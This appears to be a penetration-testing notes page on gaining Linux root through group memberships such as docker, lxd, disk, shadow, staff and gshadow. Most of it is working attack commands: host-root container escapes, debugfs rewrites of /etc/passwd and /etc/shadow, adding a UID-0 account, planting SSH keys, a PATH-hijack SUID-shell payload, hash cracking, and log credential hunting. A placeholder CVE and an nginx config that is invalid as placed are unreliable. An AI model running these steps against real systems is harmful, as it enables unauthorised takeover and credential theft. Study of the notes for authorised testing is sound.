+++
title = 'Privileged Groups'
date = 2026-10-30
type = 'notes'
weight = 20
toc = true
tags = ['linux', 'privilege-escalation', 'groups', 'sudo']
+++

Group membership is often the shortest path to root — shorter than any kernel exploit and far less risky. The critical first command after landing a shell is `id` or `groups`, because a single membership in `docker`, `lxd`, or `disk` is functionally equivalent to root. This file covers every group that grants a meaningful escalation primitive, ordered roughly by how directly it leads to root.

---

## 1. Docker Group

> Placing a user in the `docker` group is essentially **equivalent to root-level access to the file system without requiring a password**. Members can spawn new containers, and the Docker daemon runs as root.

### Enumeration

```bash
id | grep -o 'docker'
ls -la /var/run/docker.sock
docker version
docker images          # list locally available images — avoids pulling on isolated networks
docker ps
```

### Exploitation — mount host root

```bash
# Interactive root shell via chroot
docker run -v /:/host -it <image> chroot /host /bin/bash

# Non-interactive read
docker run --rm -v /:/host --entrypoint cat <image> /host/etc/shadow
```

Use an image that is **already present locally** (`docker images`). If no image exists and the target has no internet access, `docker pull` will fail; look for a running container and `docker exec` into it instead.

### Alternative — `nsenter` (no image needed)

```bash
docker run --rm -v /:/mnt --cap-add=SYS_ADMIN alpine nsenter -t 1 -m -u -n -i sh
```

This enters the host’s PID 1 namespaces directly and drops you into the host init context.

> **Warning:** `docker run -v /root:/mnt ...` only exposes `/root`, so you cannot read `/etc/shadow` from it. Mount `/` instead.

### Relevant Docker CVEs

- **CVE-2025-9074** — Docker Desktop remote API exposed without authentication (CVSS 9.3); allows container escape via privileged container creation. Primarily affects Docker Desktop, but the exposed-API pattern is relevant to any `docker.sock` accessible over TCP.
- **CVE-2025-57848** — container images where `/etc/passwd` is group-writable at build time; a user in the `root` group can add a UID-0 account.

---

## 2. LXC / LXD Group

> **Prerequisites:** membership in the `lxc` or `lxd` group.
>
> **Description:** it is possible to grant ourselves root privileges by creating a privileged container that mounts the host filesystem. The container template is often left on the target machine without password protection.

### Enumeration

```bash
id | grep -E 'lxd|lxc'
lxc image list
lxc list
```

### Classic attack path — privileged container with host mount

```bash
# 1. Import an image (if none exists)
lxc image import <template>.tar.xz --alias temp
lxc image list

# 2. Create a privileged container (no UID mapping — root inside is root on the host)
lxc init temp r00t -c security.privileged=true

# 3. Mount the host filesystem read-write
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

# 4. Start and enter
lxc start r00t
lxc exec r00t /bin/bash
```

Inside the container, the host filesystem is at `/mnt/root`:

```bash
chroot /mnt/root /bin/bash
# or:
echo 'attacker::0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd
# or drop an SSH key:
mkdir -p /mnt/root/root/.ssh
echo 'ssh-ed25519 AAAA... attacker' >> /mnt/root/root/.ssh/authorized_keys
```

> **Info:** `security.privileged=true` disables UID mapping, so root inside the container is the same UID as root on the host.

### Building an image if none exists

```bash
mkdir rootfs
tar xzf alpine-minirootfs.tar.gz -C rootfs/
# create metadata.yaml
tar czf alpine.tar.gz metadata.yaml rootfs/
lxc image import /tmp/alpine.tar.gz --alias myalpine
lxc init myalpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc -- cat /mnt/root/etc/shadow
```

### CVE-2025-64507 — LXD custom storage volume privilege escalation

A local privilege escalation in **LXD** (and **Incus**) when an unprivileged user has access to LXD through `lxd-user` with a less-privileged `lxd` group. If a custom storage volume has `security.shifted` set to `true`, an unprivileged user can **write a setuid binary from within the container** and execute it on the host to gain root.

**Affected:** LXD environments using `lxd-user`; Incus versions prior to **6.0.6** and **6.19.0** (fixed in those releases).

```bash
lxd --version
incus --version 2>/dev/null
# check for custom volumes with security.shifted=true
lxc storage volume list <pool> 2>/dev/null
```

---

## 3. Disk Group

> Users in the `disk` group have **full read and write access to block devices** in `/dev` — such as `/dev/sda1`, typically the main OS device. This allows reading and modifying the filesystem **without mounting it**, using `debugfs`.

This is **direct root-equivalent access**: you can read `/etc/shadow`, write an SSH key, or add a UID-0 user — all without touching the running system’s permissions.

### Identify the device

```bash
id | grep disk
lsblk
fdisk -l 2>/dev/null
cat /proc/partitions
```

### Read files without mounting

```bash
debugfs -R 'cat /etc/shadow' /dev/sda1
debugfs -R 'cat /root/.ssh/id_rsa' /dev/sda1
debugfs -R 'cat /etc/passwd' /dev/sda1
```

### Write a file (modifies the filesystem — be careful)

```bash
# Write an SSH key
debugfs -w -R 'write /tmp/authorized_keys /root/.ssh/authorized_keys' /dev/sda1

# Add a UID-0 user: extract, edit locally, write back
debugfs -R 'cat /etc/passwd' /dev/sda1 > /tmp/passwd
debugfs -R 'cat /etc/shadow' /dev/sda1 > /tmp/shadow
# edit /tmp/passwd and /tmp/shadow locally
debugfs -w -R 'rm /etc/passwd' /dev/sda1
debugfs -w -R 'write /tmp/passwd /etc/passwd' /dev/sda1
debugfs -w -R 'rm /etc/shadow' /dev/sda1
debugfs -w -R 'write /tmp/shadow /etc/shadow' /dev/sda1
```

> **Caution:** These operations modify the raw filesystem. A backup is not possible without another disk; prefer read-only extraction first, and only write when you understand the block layout. If the filesystem is mounted, the kernel may cache stale inodes — a reboot may be required for changes to take effect.

### Alternative — mount the device

If `mount` is available (and you have the privilege, which `disk` group membership does not grant by itself — mount requires `CAP_SYS_ADMIN`), you can mount the device and access it normally. Without mount privileges, `debugfs` is the correct tool.

---

## 4. Shadow Group

> On Debian/Ubuntu, members of the `shadow` group can read `/etc/shadow` (typically `640 root:shadow`). This exposes password hashes for offline cracking.

### Enumeration

```bash
id | grep shadow
ls -la /etc/shadow
cat /etc/shadow
```

### Cracking

```bash
unshadow /etc/passwd /etc/shadow > /tmp/hashes

hashcat -m 1800 /tmp/hashes /usr/share/wordlists/rockyou.txt   # SHA-512 crypt ($6$)
hashcat -m 500  /tmp/hashes /usr/share/wordlists/rockyou.txt   # MD5 crypt ($1$)
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes
```

A recovered password should immediately be retried with `su -`, `sudo -l`, `ssh <user>@localhost`, and against other users. A weak **root** hash is a direct win; a weak user hash may enable lateral movement to a user with sudo rights.

> **Note:** `/etc/shadow` is sometimes group-readable by `shadow` but not world-readable. If you are in the group, the file is directly readable — no exploit needed.

---

## 5. Sudo / Wheel / Admin Groups

> `sudo` (Debian/Ubuntu), `wheel` (RHEL/CentOS), and `admin` (older Debian/Ubuntu) members are allowed to run commands as root according to `/etc/sudoers`. A common policy is `%sudo ALL=(ALL:ALL) ALL` or `%wheel ALL=(ALL) ALL`.

### Enumeration

```bash
id | grep -E 'sudo|wheel|admin'
sudo -l
```

### Exploitation

If `sudo -l` shows `(ALL : ALL) ALL`:

```bash
sudo su -
# or
sudo -i
```

If the group is restricted to specific binaries, those are **GTFOBins candidates**. Read the output for `NOPASSWD`, `SETENV`, and `env_keep`.

> **Important:** Membership in `sudo` or `wheel` does **not** always mean full sudo. An included `sudoers.d` file may restrict the user to a specific binary — but a single allowed binary is often enough (see the **Sudo Abuse** section).

### `newgrp` to activate a recently added group

If you were added to `sudo`/`wheel` but your session predates the change, use `newgrp` to activate it without re-login:

```bash
newgrp sudo
id
```

---

## 6. Staff Group

> On some distributions, the `staff` group has **write access to `/usr/local`** (and sometimes `/opt`), which is often in root’s `PATH`. Executables in `/usr/local/bin` are in the `PATH` of every user, including root.

A writable `/usr/local/bin` allows planting a binary that a root cron job or an administrator will execute — or simply replacing an existing binary that root invokes.

### Enumeration

```bash
id | grep staff
ls -ld /usr/local /usr/local/bin /usr/local/lib /opt
find /usr/local -writable -type f 2>/dev/null
```

### Exploitation — PATH hijack via `/usr/local/bin`

```bash
# Identify a root-executed command that resides in /usr/local/bin
# or a script that calls a binary by bare name
ls -la /usr/local/bin/

# Plant a payload with the same name as a command root will run
cat > /usr/local/bin/<command> << 'EOF'
#!/bin/sh
cp /bin/bash /tmp/.rootbash
chmod u+s /tmp/.rootbash
EOF
chmod +x /usr/local/bin/<command>

# After root executes the command:
/tmp/.rootbash -p
```

> **Historical context:** Debian’s `staff` group writable `/usr/local/lib` has been a known root-compromise path since at least 2008 (Debian bug #504516), because `/usr/local/lib` is in the default library search path. Modern Debian/Ubuntu have tightened permissions, but custom images and older systems may still be exposed. Check `ls -ld /usr/local/lib`; if it is group-writable by `staff`, plant a shared library with a constructor (see **Miscellaneous Techniques → Shared Object Hijacking**).

---

## 7. Adm Group

> Members of the `adm` group can **read all logs** stored in `/var/log`. This does not directly grant root access, but logs frequently contain credentials, command lines with passwords, and paths to writable root-executed scripts.

### Enumeration

```bash
id | grep adm
ls -la /var/log/
ls -la /var/log/apache2/ /var/log/nginx/ 2>/dev/null
```

### Credential extraction from logs

```bash
# Authentication logs — password changes, sudo commands, accepted logins
grep -iE 'password|passwd|secret|token|sudo.*COMMAND|accepted' /var/log/auth.log 2>/dev/null

# Application logs — credentials in error messages, URL parameters, query strings
grep -riE 'pass|token|key|secret|auth' /var/log/apache2/ /var/log/nginx/ 2>/dev/null

# Command-line arguments logged by auditd (see audit group)
grep 'type=EXECVE' /var/log/audit/audit.log 2>/dev/null
```

A real-world example: **HTB Doctor** — `www-data` was a member of `adm`, which allowed reading Apache logs that contained a plaintext password for another user (`shaun`), enabling horizontal escalation.

### Log files as a map of root activity

Logs reveal which scripts root executes, when cron jobs fire, and where writable files are touched. Cross-reference log timestamps with `find / -mmin -10` to identify the exact file a root job is writing.

---

## 8. Systemd-Journal Group

> Membership in `systemd-journal` grants read access to the **binary systemd journal** — equivalent to `journalctl` output for all services, including those running as root. On many distributions, this is broader than `adm`: it includes the full journal, not just text files in `/var/log`.

### Enumeration and reading

```bash
id | grep systemd-journal
journalctl --no-pager | head
journalctl -u <service> --no-pager
journalctl _COMM=sudo --no-pager
journalctl _UID=0 --no-pager
```

### What to look for

```bash
# Credentials passed as command-line arguments (journal records argv)
journalctl --no-pager | grep -iE 'pass|token|secret|key'

# Sudo commands and their arguments
journalctl _COMM=sudo --no-pager | grep 'COMMAND='

# Service start lines — reveal ExecStart paths that may be writable
journalctl -u <service> --no-pager | grep -i 'start\|exec'
```

> **Why it matters:** The journal captures **argv** (full command lines) and **environment** for many services. A root-run `mysqldump -u root -pPASSWORD` will appear verbatim. `pspy` may miss short-lived processes; the journal does not.

---

## 9. Audit Group

> Members of the `audit` group can read **`/var/log/audit/audit.log`**, the kernel audit trail. Audit records include `type=EXECVE`, which captures the **full argv** of every executed command — including passwords passed as arguments.

### Enumeration and extraction

```bash
id | grep audit
ls -la /var/log/audit/
grep 'type=EXECVE' /var/log/audit/audit.log 2>/dev/null | head -50
ausearch -m EXECVE 2>/dev/null | head
```

### Credential hunting in audit logs

```bash
grep -iE 'pass|token|secret|key' /var/log/audit/audit.log 2>/dev/null
grep 'type=EXECVE' /var/log/audit/audit.log 2>/dev/null | grep -iE 'mysql|ssh|sudo|passwd'
```

Audit logs are particularly valuable because they record commands that `ps` never sees (short-lived processes) and that syslog may not capture.

---

## 10. Video and Render Groups

> Membership in `video` or `render` grants access to **DRM devices** (`/dev/video*`, `/dev/dri/renderD*`). These are not “just” display devices — they are kernel attack surface with a history of privilege-escalation bugs.

### Enumeration

```bash
id | grep -E 'video|render'
ls -la /dev/dri/ /dev/video* 2>/dev/null
```

### Relevant CVEs

- **CVE-2023-5633** — Ubuntu kernel: “Local user with access to DRM devices (video or render groups) can escalate privileges” when running inside a VMware guest with 3D acceleration.
- **CVE-2026-46215** — use-after-free in the DRM core ioctl (`0xD2`), reachable by **any user with access to a render node** (`/dev/dri/renderD*`), which systemd-logind grants to the active session on all major desktop distributions. A public PoC exists.

```bash
# Check DRM render node access
ls -la /dev/dri/renderD*
# If accessible, search for the matching kernel exploit
searchsploit "DRM render" $(uname -r)
```

> **Note:** These are kernel bugs, not configuration flaws. Prefer group-based escalation paths (docker, lxd, disk) first; video/render is a fallback when the kernel is vulnerable and other paths are closed.

---

## 11. Proxy Group

> Membership in `proxy` grants write access to **`/etc/nginx/` or `/etc/apache2/`** configuration directories on some distributions. A writable web-server config is a code-execution primitive: the server runs as root (or as a privileged user) and reloads its configuration without a full restart.

### Enumeration

```bash
id | grep proxy
ls -ld /etc/nginx/ /etc/apache2/
find /etc/nginx /etc/apache2 -writable 2>/dev/null
```

### Exploitation — inject a config that executes a command

If `/etc/nginx/conf.d/` or `/etc/apache2/sites-enabled/` is writable, add a snippet that runs a payload on the next reload. For nginx:

```nginx
# /etc/nginx/conf.d/evil.conf
user root;
worker_processes 1;
events { worker_connections 1024; }
http {
    server {
        listen 9999;
        location / {
            root /;
            autoindex on;
        }
    }
}
```

For Apache, a `ScriptAlias` or `CGI` directive pointing at a writable script achieves the same. Trigger a reload:

```bash
systemctl reload nginx 2>/dev/null
systemctl reload apache2 2>/dev/null
```

> **Note:** `proxy` group abuse is distribution-dependent; on many systems the config directories are root-only. Check permissions before assuming this path exists.

---

## 12. Gshadow / Newgrp — Group Password Weakness

> `/etc/gshadow` is the shadow counterpart of `/etc/group`. If a group entry has an **empty password field** (not `!` or `*`), **any user** can join that group with `newgrp` — even if not listed as a member in `/etc/group`.

This is a direct path into `docker`, `lxd`, `disk`, or `sudo` — the highest-value groups — without any other misconfiguration.

### Detection

```bash
cat /etc/gshadow 2>/dev/null
# format: group:password:admins:members
# empty 2nd field = no password required for newgrp

getent group docker
getent group lxd
getent group sudo
```

### Exploitation

```bash
newgrp docker
id
# gid now includes docker
docker run -v /:/host -it <image> chroot /host /bin/bash
```

### CVE-2026-XXXX — removal from `/etc/group` does not revoke access

A logic flaw in the shadow-utils family: if a group has an entry in `/etc/gshadow`, `newgrp` and `sg` use **that** entry to determine membership and password — **not** `/etc/group`. A user removed from `/etc/group` can therefore still `sg` into the group if the `gshadow` entry still lists them (or has an empty password), regaining membership in `docker`, `lxd`, `disk`, or `sudo`.

```bash
# Check whether you are still listed in gshadow despite removal from /etc/group
getent gshadow docker
getent group docker
```

---

## Triage — Check These Groups First

Run these in order after landing a shell. Most boxes fall in the first four checks.

```bash
# 1. What groups do I have?
id

# 2. Root-equivalent groups — immediate escalation
for g in docker lxd lxc disk shadow sudo wheel admin staff; do
    id | grep -qw "$g" && echo "PRIVILEGED: $g"
done

# 3. gshadow empty password (any group joinable)
grep -E '^[^:]+:[^!*]' /etc/gshadow 2>/dev/null

# 4. Staff / proxy writable directories
ls -ld /usr/local/bin /usr/local/lib /etc/nginx /etc/apache2 2>/dev/null

# 5. Log-reading groups
for g in adm systemd-journal audit; do
    id | grep -qw "$g" && echo "LOG ACCESS: $g"
done

# 6. Video / render
id | grep -qE 'video|render' && ls -la /dev/dri/ 2>/dev/null
```

---

## Quick Reference — Group → Payoff

| Group | Precondition | Payoff |
|---|---|---|
| **docker** | Socket accessible | Host root via `chroot /host` |
| **lxd / lxc** | Group membership, or CVE-2025-64507 | Host root via privileged container |
| **disk** | Group membership | Read/write any file via `debugfs` |
| **shadow** | Group membership | `/etc/shadow` → crack → root (if weak) |
| **sudo / wheel / admin** | Group membership | Root via `sudo su -` or GTFOBins |
| **staff** | Writable `/usr/local` | PATH hijack → root |
| **adm** | Group membership | Logs → credentials → lateral / root |
| **systemd-journal** | Group membership | Full journal → argv creds |
| **audit** | Group membership | `EXECVE` records → argv creds |
| **video / render** | DRM device access | Kernel attack surface (CVE-2023-5633, CVE-2026-46215) |
| **proxy** | Writable web config | Code execution on reload |
| **gshadow (empty pw)** | Readable `/etc/gshadow` | `newgrp docker` → root |

---

This file complements **Capabilities Abuse**, **Environment Variables Abuse**, and **Miscellaneous Techniques**. Group membership is the first thing to check and often the last thing you need — if `docker`, `lxd`, or `disk` is present, stop enumerating and escalate.
